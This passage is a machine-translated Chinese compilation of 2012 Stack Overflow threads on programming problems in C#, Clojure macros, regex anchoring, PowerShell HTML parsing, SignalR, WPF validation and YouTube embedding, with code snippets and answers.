> 
> 时间：2012-07-25T14:03:12.810

您可以使用 获取数组的长度`arrayName.Length`。

```
for (iCounter = 0; iCounter < frpdReport.Length; iCounter++) 
{ 
    if (frpdReport[iCounter].iReportID == iReportID) 
    { 
        fGetReportFile_return = frpdReport[iCounter].tReportFile; 
    } 
} 
return fGetReportFile_return; 
```

或者简单的`foreach`构造：

```
foreach (REPORTDEF frpdReportItem in frpdReport) 
{ 
    if (frpdReportItem.iReportID == iReportID) 
    { 
        fGetReportFile_return = frpdReportItem.tReportFile; 
    } 
} 
return fGetReportFile_return; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-25T14:01:18.233

这一行是错误的：

```
for (iCounter = 0; iCounter < Convert.ToInt32(frpdReport[6]); iCounter++) 
```

它应该是：

```
for (iCounter = 0; iCounter < 6; iCounter++) 
```

`frpdReport`被定义为一个六元素数组；在 C# 中，数组是从零开始的，因此`frpdReport[6]`会产生错误，因为只有元素 0 到 5。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:01:14.630

`REPORTDEF[6]`定义了 6 个元素，从 0 到 5。

`Convert.ToInt32(frpdReport[6])`似乎根本没有意义。您正在将结构转换为数字。

# macros - 关于匿名“自我引用”数据结构的建议/讨论

> ID：11651420
> 
> 赞同：8
> 
> 时间：2012-07-25T13:57:58.277
> 
> 标签：macros, clojure, self-reference

对任何错误的术语表示歉意——我对计算机科学很陌生，而且我几乎只知道 Clojure（但我想我会说我非常了解）。

所以，我还没有对此进行大量研究，但我有时发现它在编写 Clojure 代码时很有用，以便能够从该数据结构中引用一些“我所在的任何数据结构的中间版本” （很像 a `let`）。快速示例：

```
=> (self-ish {:a 10
              :b (inc (this :a))
              :c (count (vals this))})
=> {:a 10, :b 11, :c 3}
=> (self-ish ["a" "b" (reduce str this)])
=> ["a" "b" "ab"]
//Works in any nested bits too
=> (self-ish [1 2 3 [4 5 (first this)] 6 [7 [8 (cons (second this) (nth this 3))]]])
=> [1 2 3 [4 5 1] 6 [7 [8 (2 4 5 1)]]] 
```

这个想法是结构逐渐建立起来，并且在任何阶段都有能力将当前的中间结构称为`this`. 这是我当前实现的代码：

```
//Random straightforward but helpful definitions
(defn map-entry? [obj]
  (instance? clojure.lang.AMapEntry obj))
(def Map clojure.lang.IPersistentMap)
(def Vector clojure.lang.IPersistentVector)
(def List clojure.lang.IPersistentList)
(def Set clojure.lang.IPersistentSet)

(defn append
  [x coll]
  (if-not coll x
    (condp instance? coll
      Map (if (empty? x) coll
            (assoc coll (first x) (second x)))
      Vector (conj coll x)
      Set (conj coll x)
      List (apply list (concat coll [x]))
      (concat coll [x]))))

(defn build-this
  [acc-stack acc]
  (->> (cons acc acc-stack)
       (drop-while list?)
       (drop-while (every-pred empty? identity))
       (reduce append)))

(defn self-indulge
  [acc-stack acc form]
  ;//Un-comment the following to see it print intermediate stages of processing
  #_(println "this:" (build-this acc-stack acc) "\n  at:" form)
  (append (cond
            (coll? form) (reduce (partial self-indulge (cons acc acc-stack))
                                 (if (map-entry? form) []
                                   (empty form))
                                 form)
            (= (quote this) form) (build-this acc-stack acc)
            :else form)
          acc))

(defmacro self-ish
  [form]
  (self-indulge () nil form)) 
```

该`append`函数将一个项目附加到一个集合上并返回相同类型的集合。该`self-indulge`函数有一个标准的类似 reduce 的累加器，它只是构建表单元素。它还有一个累加器堆栈，每次`self-indulge`重复时都会变长。这样做的目的是跟踪其他“更高”的累加器，因此这`this`将是整个结构，而不仅仅是本地部分。`self-ish`宏很好地包裹起来（它使用`self-indulge`调用自己`partial`，所以它不能穿宏裤子）。

**编辑：示例用例** 对我来说，这个宏是关于试图增加代码的可读性，而不是真正扩展功能。我发现这很有用的地方是在我有部分冗余数据的手写结构的情况下——或者也许“依赖”是一个更好的词。阅读代码并查看数据结构的不同部分会更容易，如果我修改结构的一部分中的数据值并希望该更改反映在其他部分中，它也会很有用。例如：

```
=> (self-ish {:favorite-books (list "Crime and Punishment" "Mrs. Dalloway")
              :favorite-things (list* "Ice Cream" "Hammocks" (this :favorite-books)})
=> {:favorite-things ("Ice Cream" "Hammocks" "Crime and Punishment" "Mrs. Dalloway"),
    :favorite-books ("Crime and Punishment" "Mrs. Dalloway")} 
```

在人们可能真的想在数据中包含一些烘焙的东西时，它也可能很有用，而不是使用某些函数即时导出。这些情况可能要少得多，而且我认为当您可以使用漂亮的干净函数来操作数据时，不必要地纠缠数据是一个坏主意。

我的主要问题：

1.  这真的有用吗，还是会产生太多的歧义/复杂性？我想我并不孤单想要/使用这种类型的宏。其他人在这里有什么经验？你用这样的东西吗？你找到更好的解决方法了吗？是否有任何 Clojure 库中没有类似内容的原因？或者有什么我还没有看到的？
2.  有没有更好的命名约定我可以使用——而不是`self-ish`and `this`？比如可能`this`是太加载了OOP的意思，我不确定，我基本上只熟悉Clojure。
3.  我对计算机科学很陌生，是否有与此类事物相关的可访问且信息丰富的资源——我想我会称之为匿名自我引用（也许反身是一个更好的词？）数据结构？我还没有发现任何既平易近人又信息丰富的东西。
4.  有没有更好的方法来编写`self-ish`宏？上面，我已经包含了我当前的版本，但我无法摆脱可能有更简单方法的感觉。
5.  我对什么可能是“最明智的”实施细节有各种疑问。

    *   [**遍历**](http://en.wikipedia.org/wiki/Tree_traversal)：是广度优先还是深度优先？如果深度优先，是前序、后序还是有序？现在，我相信它是深度优先预购，这对我来说很有意义，但也许它有一些我没有注意到的缺点。
    *   **订单问题**：（[有关我之前的相关问题，请参见此处](https://stackoverflow.com/questions/11130460/clojure-macro-that-will-conserve-associative-map-order)）在内部`{}`（即手写地图）中，如果不使用`array-map`或`sorted-map`- 换句话说，在 8 个地图条目以上，`{}`用法是不可能正确维护订单（超过 8 个地图条目）不安全。也许不是手写的顺序，宏可以做一些花哨的魔法来以一些“理想”的顺序处理项目？或者也许最好将所有地图包裹在`(array-map ...)`其中而不是令人赏心悦目`{}`？

        ```
        //Showing maps with 9 entries failing
        => (self-ish {:a 1
                      :b (inc (this :a))
                      :c (inc (this :b))
                      :d (inc (this :c))
                      :e (inc (this :d))
                      :f (inc (this :e))
                      :g (inc (this :f))
                      :h (inc (this :g))
                      :i (inc (this :h))})
        => NullPointerException   clojure.lang.Numbers.ops (Numbers.java:942)
        //8 works fine
        => (self-ish {:a 1
                      :b (inc (this :a))
                      :c (inc (this :b))
                      :d (inc (this :c))
                      :e (inc (this :d))
                      :f (inc (this :e))
                      :g (inc (this :f))
                      :h (inc (this :g))})
        => {:h 8, :g 7, :f 6, :e 5, :d 4, :c 3, :b 2, :a 1} 
        ```

    *   **Serial**：正如我所写，宏通过串行处理其元素来避免无限递归，类似于`let`，但这确实会产生潜在的奇怪行为。例如，在我上面的快速示例中，`(reduce str this)`返回`"ab"`因为`this`在`["a" "b"]`该步骤。也许有时创建某种无限的惰性序列会很有用？如果是这样，那将如何实施？

    *   **映射条目**：现在，映射条目被视为向量，但由于如何`this`在任何中间步骤调用，完全有可能`nil`从“尚未”分配值的键中获取值。这就是为什么在我的第一个快速示例中，`:c`最终映射到 3——因为中间有一个`nil`对应于`:c`，并且也被计算在内。你认为这值得修复吗？
    *   **非宏实用程序**：仅`self-indulge`在宏上下文之外使用是微不足道的，但这可能有用吗？

感谢阅读，任何帮助表示赞赏:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T23:47:58.000

在方案中，这样做`(letrec ...)`可以让您引用结构本身内部的数据结构的名称。因此，如果您想定义自己的执行方式，那么实现它可能更有意义。您可以使用在[是否可以在 Clojure 中创建循环引用的答案中描述的引用技巧来做到这一点？](https://stackoverflow.com/questions/3696214/is-it-possible-to-create-circular-references-in-clojure)

letrec 的一个优点是它有一个用户指定的名称（如果您的宏是嵌套的，那么`this`它会被隐藏）。

[编辑删除类型的评论，因为我不明白你的宏。]

[更新] 另外，您可能对 clojure 第 8.5.1 节中回指的讨论感兴趣

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-26T03:34:49.347

这种方法对我来说“感觉”有点不对劲，尽管我不太清楚为什么。也许我不喜欢地图构建依赖于顺序的想法......

已经说过这是一个非常容易编写的宏，您实际上想要扩展为：

```
(let [this {}
      this (assoc this :a 1)
      this (assoc this :b (+ (this :a) 3))]
  this) 
```

因此，适当的宏将类似于（对于地图案例）：

```
(defmacro self-ish [bindings]
  `(let [~'this {}
         ~@(mapcat 
           #(do `(~'this (assoc ~'this ~@%)) )    
           (partition 2 bindings) )]
    ~'this))

(self-ish [:a 1
           :b (+ (this :a) 3)])
=> {:b 4, :a 1} 
```

请注意，我将绑定表单设置为矢量，因为地图绑定表单是无序的。

仍然不确定我有多喜欢这个成语。我首选的方法通常是使用 let 形式定义结构，并为临时计算赋予有意义的名称，例如：

```
(let [meaningful-foo (something)
      meaningful-bar (something-else)]
   {:foo meaningful-foo
    :bar meaningful-bar
    :baz (some-calculation meaningful-foo meaningful-bar)}) 
```

# c# - ConsoleApplication/Service 需要 40 秒才能启动

> ID：11651421
> 
> 赞同：1
> 
> 时间：2012-07-25T13:58:00.387
> 
> 标签：c#, windows, .net-3.5, windows-services

我基本上有以下内容：

```
partial class OperationWindowsService : ServiceBase
{
public static void Main(string[] args)
{
Console.WriteLine("Starting app.");
//...build opservice
if (Environment.UserInteractive)
 {
   Console.WriteLine("interactive");
   var task = opservice.StartConsole(args);
}else
 {
    ServiceBase.Run(opservice);
    logger.LogInfo("ServiceBase.Run Called");
 }

}
//... normal onstart overrriden
} 
```

当作为控制台应用程序运行或在我的盒子上作为 Windows 服务运行时，它会立即启动。在某些 windowsxp 机器上，它部署到“启动应用程序”之前需要 45 秒。或出现任何日志记录。我们怀疑它与速度有关，因为有些盒子是相同的硬件/图像。

谁能让我深入了解为什么在第一行被击中之前启动应用程序需要 45 秒？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T16:57:02.740

ProcessMonitor 对查看 exe 在执行任何操作之前执行的操作非常有帮助。

结果：我已经加载了 RSACryptoServiceProvider，它加载了一个 dll，该 dll 加载了另一个试图通过网络连接验证自己的 dll。它正在运行的盒子被锁定，网络连接超时，导致加载 dll 延迟。

修复：在你的 app.config- 中设置这个

```
<runtime>
    <generatePublisherEvidence enabled="false"/>
</runtime> 
```

有关更多信息，请参阅：http: [//blogs.msdn.com/b/tess/archive/2008/05/13/asp-net-hang-authenticode-signed-assemblies.aspx](http://blogs.msdn.com/b/tess/archive/2008/05/13/asp-net-hang-authenticode-signed-assemblies.aspx)

# c# - RegularExpressionAttribute 的行为与 Regex 或 RegexStringValidator 不同

> ID：11651428
> 
> 赞同：1
> 
> 时间：2012-07-25T13:58:31.940
> 
> 标签：c#, regex, entity-framework

我在我的 EF 元数据上使用[RegularExpressionAttribute ，如下所示：](http://msdn.microsoft.com/en-us/library/system.componentmodel.dataannotations.regularexpressionattribute.aspx)

```
[RegularExpression("[A-Z]+")]
public string Code { get; set; } 
```

它正确地不允许我在该字段的任何地方输入除 AZ 以外的任何内容。

在其他地方我想在代码中使用相同的 reg 表达式，所以我像这样转向 Regex：

```
var regex = new Regex("[A-Z]+");
Console.WriteLine(regex.IsMatch("B")); //true
Console.WriteLine(regex.IsMatch("1")); //false
Console.WriteLine(regex.IsMatch("A1")); //true - why? 
```

RegexStringValidator的工作[方式](http://msdn.microsoft.com/en-us/library/system.configuration.regexstringvalidator.aspx)也与 Regex 相同。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-25T14:01:51.897

> ```
> var regex = new Regex("[A-Z]+");
> Console.WriteLine(regex.IsMatch("A1")); //true - why? 
> ```

该正则表达式表示匹配一个或多个大写拉丁字母。并且“ `A1`”包含一个大写的拉丁字母。

默认情况下，正则表达式匹配字符串中的*任何位置。*要匹配整个字符串以字符串锚点的“ `^`”*开头并以字符串锚点*的“ `$`”*结尾结尾*：

```
 var regex = new Regex("^[A-Z]+$");
 Console.WriteLine(regex.IsMatch("A1")); 
```

将显示`false`。

（.NET 正则表达式中有一整套[锚](http://msdn.microsoft.com/en-us/library/az24scfc.aspx#atomic_zerowidth_assertions)。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-25T14:00:19.420

可能你想要这个：

```
"^[A-Z]+$" 
```

`"[A-Z]+"`将匹配一个或多个字母，不管它们在字符串中的位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:00:20.533

你必须锚定你的正则表达式

```
"^[A-Z]$" 
```

# javascript - YQL Twitter 时间线 超出速率限制。解决方法

> ID：11651430
> 
> 赞同：0
> 
> 时间：2012-07-25T13:58:36.790
> 
> 标签：javascript, jquery, ajax, twitter, yql

我正在寻找适合我的情况的解决方案/建议：

我想使用 YQL 获取 twitter 时间线提要，

**饲料示例：**

[https://api.twitter.com/1/statuses/user_timeline.json?include_entities=true&include_rts=true&screen_name=NynasBo&count=2](https://api.twitter.com/1/statuses/user_timeline.json?include_entities=true&include_rts=true&screen_name=NynasBo&count=2)

这是我的 YQL 查询字符串：

```
select * from json where url="https://api.twitter.com/1/statuses/user_timeline.json?include_entities=true&include_rts=true&screen_name=NynasBo&count=2" 
```

但是因为 twitter 对调用次数有限制，当然我几乎总是得到“**超出速率限制**”，因为很多用户都在使用 yahoo 域名。

我想并建议在这种情况下，制造商如何有解决方案或解决方法，例如：

更改域名，使用不同的表格，不同的方式来获取提要，其他的，因为..等

不幸的是，我对 YQL 没有丰富的经验 :(。

PS：

*我只使用客户端代码（javascript/jQuery）*

**为什么我需要在这个 cae 中使用 YQL**：

我想将大约 10-15 个用户时间线合并为一个，为此我必须进行 10-15 个 AJAX 调用，其中 YQl 有**yql.query.multi**表，这对我来说是一个完美的解决方案，我可以结合所有这些查询合二为一并使用 1 个 AJAX 调用。

我很感激任何帮助。

*对不起我的英语不好*

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-26T18:37:19.687

亚历克斯，

查看页面上的“我如何开始”部分：http: [//developer.yahoo.com/yql/](http://developer.yahoo.com/yql/)并获取访问密钥。您可能需要一个 oauth 库。

如果您没有访问密钥，则适用“每 IP 速率限制”。从上面的网页来看，速率限制如下：

使用限制 每个应用程序限制（由您的访问密钥标识）：每天 100,000 次调用 每个
IP 限制：/v1/public/ *：每小时 2,000 次调用；/v1/yql/* : 每小时 20,000 次通话

# html - 使用 powershell 检索 HTML 中的文本

> ID：11651431
> 
> 赞同：4
> 
> 时间：2012-07-25T13:58:37.830
> 
> 标签：html, regex, powershell

在这个 html 代码中：

```
<div id="ajaxWarningRegion" class="infoFont"></div>
  <span id="ajaxStatusRegion"></span>
  <form enctype="multipart/form-data" method="post" name="confIPBackupForm" action="/cgi-bin/utilserv/confIPBackup/w_confIPBackup" id="confIPBackupForm" >
    <pre>
      Creating a new ZIP of IP Phone files from HTTP/PhoneBackup 
      and HTTPS/PhoneBackup
    </pre>
    <pre> /tmp/IP_PHONE_BACKUP-2012-Jul-25_15:47:47.zip</pre>
    <pre>Reports Success</pre>
    <pre></pre>
    <a href =  /tmp/IP_PHONE_BACKUP-2012-Jul-25_15:47:47.zip>
      Download the new ZIP of IP Phone files
    </a>
  </div> 
```

我想检索文本`IP_PHONE_BACKUP-2012-Jul-25_15:47:47.zip`或仅检索和之间的日期和`IP_PHONE_BACKUP-`时间`.zip`

我怎样才能做到这一点 ？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-25T18:40:43.313

使这个问题如此有趣的原因在于，HTML 看起来和闻起来都像 XML，后者由于其行为良好且有序的结构而更具可编程性。在理想世界中，HTML 将是 XML 的子集，但现实世界中的 HTML 显然*不是*XML。如果您将问题中的示例提供给任何 XML 解析器，它会因各种违规行为而犹豫不决。话虽如此，只需一行 PowerShell 即可实现所需的结果。这个返回href的整个文本：

```
Select-NodeContent $doc.DocumentNode "//a/@href" 
```

而这个提取所需的子字符串：

```
Select-NodeContent $doc.DocumentNode "//a/@href" "IP_PHONE_BACKUP-(.*)\.zip" 
```

然而，问题在于能够运行那一行代码的开销/设置。你需要：

*   **安装[HtmlAgilityPack](http://htmlagilitypack.codeplex.com/)**使 HTML 解析看起来像 XML 解析。
*   如果要解析实时网页，请**安装****[PowerShell 社区扩展。](http://pscx.codeplex.com/)**
*   **了解 XPath**以便能够构建到目标节点的可导航路径。
*   **了解正则表达式**以便能够从目标节点中提取子字符串。

满足这些要求后，您可以将`HTMLAgilityPath`类型添加到您的环境并定义`Select-NodeContent`函数，如下所示。代码的最后显示了如何`$doc`为上述单行代码中使用的变量赋值。我将展示如何根据您的需要从文件或网络加载 HTML。

```
Set-StrictMode -Version Latest
$HtmlAgilityPackPath = [System.IO.Path]::Combine((Get-Item $PROFILE).DirectoryName, "bin\HtmlAgilityPack.dll")
Add-Type -Path $HtmlAgilityPackPath

function Select-NodeContent(
    [HtmlAgilityPack.HtmlNode]$node,
    [string] $xpath,
    [string] $regex,
    [Object] $default = "")
{
    if ($xpath -match "(.*)/@(\w+)$") {
        # If standard XPath to retrieve an attribute is given,
        # map to supported operations to retrieve the attribute's text.
        ($xpath, $attribute) = $matches[1], $matches[2]
        $resultNode = $node.SelectSingleNode($xpath)
        $text = ?: { $resultNode } { $resultNode.Attributes[$attribute].Value } { $default }
    }
    else { # retrieve an element's text
        $resultNode = $node.SelectSingleNode($xpath)
        $text = ?: { $resultNode } { $resultNode.InnerText } { $default }
    }
    # If a regex is given, use it to extract a substring from the text
    if ($regex) {
        if ($text -match $regex) { $text = $matches[1] }
        else { $text = $default }
    }
    return $text
}

$doc = New-Object HtmlAgilityPack.HtmlDocument
$result = $doc.Load("tmp\temp.html") # Use this to load a file
#$result = $doc.LoadHtml((Get-HttpResource $url)) # Use this  PSCX cmdlet to load a live web page 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-26T05:12:55.687

实际上，文件名周围的 HTML 在这里是无关紧要的。您可以使用以下正则表达式很好地提取日期（它甚至不关心您是从电子邮件、HTML 页面还是 CSV 文件中提取日期）：

```
(?<=/tmp/IP_PHONE_BACKUP-)[^.]+(?=\.zip) 
```

快速测试：

```
PS> [regex]::Match($html, '(?<=/tmp/IP_PHONE_BACKUP-)[^.]+(?=\.zip)')

Groups   : {2012-Jul-25_15:47:47}
Success  : True
Captures : {2012-Jul-25_15:47:47}
Index    : 391
Length   : 20
Value    : 2012-Jul-25_15:47:47 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-25T14:12:56.270

没有正则表达式：

```
$a = '<div id="ajaxWarningRegion" class="infoFont"></div><span id="ajaxStatusRegion"></span><form enctype="multipart/form-data" method="post" name="confIPBackupForm" action="/cgi-bin/utilserv/confIPBackup/w_confIPBackup" id="confIPBackupForm" ><pre>Creating a new ZIP of IP Phone files from HTTP/PhoneBackup and HTTPS/PhoneBackup</pre><pre> /tmp/IP_PHONE_BACKUP-2012-Jul-25_15:47:47.zip</pre><pre>Reports Success</pre><pre></pre><a href =  /tmp/IP_PHONE_BACKUP-2012-Jul-25_15:47:47.zip>Download the new ZIP of IP Phone files</a></div>'
$a.Substring($a.IndexOf("IP_PHONE_BACKUP")+"IP_PHONE_BACKUP".length+1, $a.IndexOf(".zip")-$a.IndexOf("IP_PHONE_BACKUP")-"IP_PHONE_BACKUP".length-1) 
```

`Substring`为您提供原始字符串的一部分。第一个参数是子串的起始位置，第二个参数是所需子串的长度。所以现在你所要做的就是使用一点魔法来计算起点和`IndexOf`长度`Length`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-25T14:08:33.657

以下正则表达式的 group(2) 和 group(3) 接受地包含日期和时间：

```
/IP_PHONE_BACKUP-((.*)_(.*)).zip/ 
```

这是从 powershell 中的正则表达式中提取值的链接。

[有没有更短的方法可以将组从 Powershell 正则表达式中拉出来？](https://stackoverflow.com/questions/1010924/is-there-a-shorter-way-to-pull-groups-out-of-a-powershell-regex)

HIH

# c++ - 我需要单独开发一个应用程序的触摸屏版本吗

> ID：11651432
> 
> 赞同：-2
> 
> 时间：2012-07-25T13:58:39.523
> 
> 标签：c++, touch

我正在用 C++ 开发一个基于桌面的应用程序。我想让它启用触摸屏，在触摸屏可用的地方。我的问题是我需要为这个触摸屏应用程序提供单独的版本吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-25T14:06:29.963

如果您计划添加对触摸屏的专门支持，如多点触控，并为您的应用程序启用手势，您将有一些单独的代码处理。如果不是，无论您使用什么操作系统，假设您的代码是可移植的，鼠标输入应该等同于触摸输入。

话虽这么说，你的问题很模糊，我不确定我的回答是否符合你的预期。

# iis - SignalR & Windows 7 的 IIS 7.5 挂起

> ID：11651438
> 
> 赞同：2
> 
> 时间：2012-07-25T13:58:58.107
> 
> 标签：iis, iis-7.5, signalr

我现在正在使用 SignalR 和 IIS/ASP.net 4 和朋友（MySQL 等）测试新的聊天

我可以将 SignalR 与两个客户端（IE9、Chrome）或仅一个客户端一起使用，并且它可以工作。在对代码进行一些操作（刷新、更改、刷新等）之后，我可以看到对服务器的请求被冻结了几分钟，如果我想工作，我需要重新启动 IIS。

我对 IIS 进程进行了转储，并看到十个打开的连接 `poll.ashx/connect?transport=foreverFrame ....`打开了几分钟。（我使用 ashx 扩展不使用“runAllManagedModulesForAllRequests”，因为它会损害性能，它是无用的）

我试过`GlobalHost.Configuration.ConnectionTimeout = TimeSpan.FromSeconds(30)`了 `GlobalHost.Configuration.KeepAlive = null`。同样的问题。我可以在转储请求中看到打开到 2 分钟或更长时间。

我知道 Windows 7 的 IIS 限制为十个正在运行的请求，所以我打开了 Fiddler 并中止了所有会话。IIS 在终止后仍然挂起。我试图关闭 Fiddler（然后 - TCP/HTTP 连接） - 仍然挂起。

我能做些什么来阻止“丢失”的连接？客户端（提琴手或浏览器）关闭了 TCP/HTTP 连接，并且在 IIS 中仍然存在。

我不使用集线器。

谢谢 ！

# javascript - 删除数组元素并将它们添加回原来的位置

> ID：11651442
> 
> 赞同：2
> 
> 时间：2012-07-25T13:59:22.920
> 
> 标签：javascript, arrays, element, add

我试图从数组中删除元素，同时记住它们的位置并稍后将它们添加回来。到目前为止，我有这段代码：

```
var my_array = ['A', 'B', 'C', 'D', 'E'];
var removed_elements = [];

// Assuming letter provided exists in my_array
function remove_element(letter) {
    for (var index in my_array) {
        if (my_array[index] == letter) {
            break;
        }            
    }
    var removed_element = {
        index: index,
        letter: letter            
    }
    removed_elements.push(removed_element);
    my_array.splice(index,1);
}

// Assuming letter provided exists in removed_elements
function add_element(letter) {
    for (var index in removed_elements) {
        console.log('test');
        if (removed_elements[index].letter == letter) {
            console.log(removed_elements[index]);
            break;
        }            
    }
    my_array.splice(removed_elements[index].index,0,removed_elements[index].letter);
} 
```

只要我一次删除一个元素并在删除另一个元素之前将其添加回来，它就可以正常工作。但是，当我开始连续删除几个元素时，为已删除元素（不是第一个，而是后续元素）保存的索引变得相对于`my_array`删除时的状态，而不是绝对`my_array`的初始状态，这可能会导致问题.

例如，如果您删除`'B'`and`'D'`并添加`'D'`and `'B'`，您最终会得到`['A', 'B', 'C', 'E', 'D']`而不是`['A', 'B', 'C', 'D', 'E']`。

[这是一个显示问题所在的jsfiddle](http://jsfiddle.net/eGx32/)

**`my_array`无论我删除或添加多少元素以及如何添加，我应该更改哪些修改以使其最终处于初始状态？**

我考虑在删除时存储有关哪些元素围绕已删除元素的信息，并在添加时将其用作额外信息，但想知道是否有更好的方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-25T14:07:15.897

我实际上根本不会删除它们：

```
var my_array = ['A', 'B', 'C', 'D', 'E'];
var removed = [];

function remove_element(letter) {
    var i = my_array.indexOf(letter);

    if(i > -1) {
        removed.push(i);
    }
}

function add_element(letter) {
    var i = my_array.indexOf(letter);

    if(i > -1) {
        removed.splice(removed.indexOf(i), 1);
    }
}

function get_array() {
    return my_array.filter(function(x, i) {
        return removed.indexOf(i) === -1;
    });
} 
```

# http - HTTP 服务器配置内部错误 500

> ID：11651445
> 
> 赞同：1
> 
> 时间：2012-07-25T13:59:25.500
> 
> 标签：http, subversive, internal-server-error, collabnet

我已经设置了 collabnet subversion 边缘服务器，并且已经为 eclipse 安装了 subversion 团队提供程序。我在连接到我的存储库时遇到了问题，但后来我以某种方式解决了它。现在，我想用活动目录配置 LDAP，但我遇到了一些问题。尝试提交项目时出现内部 500 错误。我该如何解决这个问题？

共享项目失败。svn: '/svn/rep/!svn/act/7c716dbe-3801-0010-8bbe-21e116bed3a7' 的 MKACTIVITY: 500 内部服务器错误 (http://localhost) svn: MKACTIVITY 请求在 '/svn/rep/! svn/act/7c716dbe-3801-0010-8bbe-21e116bed3a7'

# c# - 在哪里提出 NotifyPropertyChanged？

> ID：11651446
> 
> 赞同：0
> 
> 时间：2012-07-25T13:59:27.233
> 
> 标签：c#, wpf, mvvm, inotifypropertychanged

我刚刚根据 Rachel Lim 的[博客](http://rachel53461.wordpress.com/2012/01/22/validating-business-rules-in-mvvm/)实现了我的业务逻辑验证。一切都运行良好，直到我决定在绑定到**IsValid**属性的视图中放置一个触发器，如下所示：

```
<ListBox ItemsSource="{Binding EdgedBoards}" SelectedItem="{Binding SelEdgedBoard, Mode=TwoWay}" DisplayMemberPath="Name"> 
                    <ListBox.ItemContainerStyle>
                        <Style TargetType="{x:Type ListBoxItem}" BasedOn="{StaticResource {x:Type ListBoxItem}}">
                            <Setter Property="Focusable" Value="True" />
                            <Style.Triggers>
                                <DataTrigger Binding="{Binding Path=IsValid}" Value="False">
                                    <Setter Property="Focusable" Value="False" />
                                </DataTrigger>
                            </Style.Triggers>
                        </Style>
                    </ListBox.ItemContainerStyle>
                </ListBox> 
```

问题是，当绑定项目有错误（SelEdgedBoard.IsValid == false）时，触发器不会被通知重新评估，并且项目将其可聚焦属性保持为真。

我已经尝试在 GetValidationError() 返回其值之前放置 NotifyPropertyChanged("IsValid") ，但是这样我得到了一个 stackoverflow 异常：

```
#region IsValid Property

    public bool IsValid
    {
        get
        {
            return string.IsNullOrWhiteSpace(GetValidationError());
        }
    }

    public string GetValidationError()
    {
        string error = null;

        if (ValidatedProperties != null)
        {
            foreach (string s in ValidatedProperties)
            {
                error = GetValidationError(s);
                if (!string.IsNullOrWhiteSpace(error))
                {
                    break; 
                }
            }
        }

        NotifyPropertyChanged("IsValid");
        return error;
    }

    #endregion 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-25T14:06:53.303

当然，它会导致堆栈溢出。当你这样做时：

```
NotifyPropertyChanged("IsValid") 
```

您强制 WPF 基础结构重新评估 IsValid 的值。它通过调用 IsValid getter 来做到这一点，而后者又再次调用 GetValidationError！

有几种方法可以处理这个问题。我可能会创建一个私有成员变量来保存 IsValid 的最后一个值，然后在调用 NotifyPropertyChanged 之前将当前值与旧值进行比较。

另一种方法可能是仅在您的已验证属性之一发生更改时调用 NotifyPropertyChanged("IsValid")（因此在每个属性的设置器中），因为这*可能会*导致 IsValid 发生更改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-25T14:07:49.263

```
 private bool _isValid;
    public bool IsValid
    {
        get
        {
            string.IsNullOrWhiteSpace(GetValidationError())
            return _isValid;
        }
        set
        {
            _isValid = value;
            NotifyPropertyChanged("IsValid");
        }
    }

    public string GetValidationError()
    {
        string error = null;

        if (ValidatedProperties != null)
        {
            foreach (string s in ValidatedProperties)
            {
                error = GetValidationError(s);
                if (!string.IsNullOrWhiteSpace(error))
                {
                    break;
                }
            }
        }
        IsValid=string.IsNullOrWhiteSpace(error);
        return error;
    } 
```

我希望这将有所帮助。

# youtube - 单击自定义按钮播放 youtube 视频

> ID：11651454
> 
> 赞同：3
> 
> 时间：2012-07-25T13:59:43.803
> 
> 标签：youtube, youtube-api

我确实有以下代码，我想在单击按钮时播放 youtube 视频。

我有 youtube 的 iframe 代码。

```
<script>

            var player = document.getElementById("myplayer");

            //Create a simple function and check if player exists
            function play() {
                if(player) {
                    player.playVideo();
                }
            }

 </script>

<iframe id="myplayer" width="500" height="500" src="http://www.youtube-nocookie.com/embed/C-VoyCDUvr0?rel=0&wmode=Opaque&enablejsapi=1" frameborder="0" allowfullscreen></iframe>

<a href="#" onclick="play()">Play Youtube Video</a> 
```

但是当我单击按钮/链接时它不会播放

我将脚本代码放在 html 的头部和 iframe 中，并将锚链接放在 html 的正文部分。

![在此处输入图像描述](../Images/f50e47c0cd54c585a8dc83c57eea80a9.png)

我错过了什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2015-04-15T15:44:52.390

这里我举了两个玩家的例子：

```
<!DOCTYPE html>
<html>
  <body>
    <div id="divPlayer1"></div>

<div id="divPlayer2"></div>

    <script>
      var tag = document.createElement('script');

      tag.src = "https://www.youtube.com/iframe_api";
      var firstScriptTag = document.getElementsByTagName('script')[0];
      firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

      var player1;
      var player2;
     function onYouTubeIframeAPIReady() {
        player1 = new YT.Player('divPlayer1', {
          height: '390',
          width: '640',
          videoId: 'iZYIsJ9i5yE',});

    player2 = new YT.Player('divPlayer2', {
          height: '390',
          width: '640',
          videoId: 'J7rKAKipj8s',});

      }
function play1() { 
        player1.playVideo();
      }
function play2() { 
        player2.playVideo();
      }
  </script>

<a href="#" onclick="play1()">Play Youtube Video1</a>
<a href="#" onclick="play2()"> Play Youtube Video2</a>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-04-15T15:28:15.057

This is the working code with one play. Should be altered only by videoId: 'iZYIsJ9i5yE' whity our videoId in youtube:

```
<!DOCTYPE html>
<html>
   <body>
      <div id="player"></div>

      <script>
          var tag = document.createElement('script');

          tag.src = "https://www.youtube.com/iframe_api";
          var firstScriptTag = document.getElementsByTagName('script')[0];
          firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

          var player1;
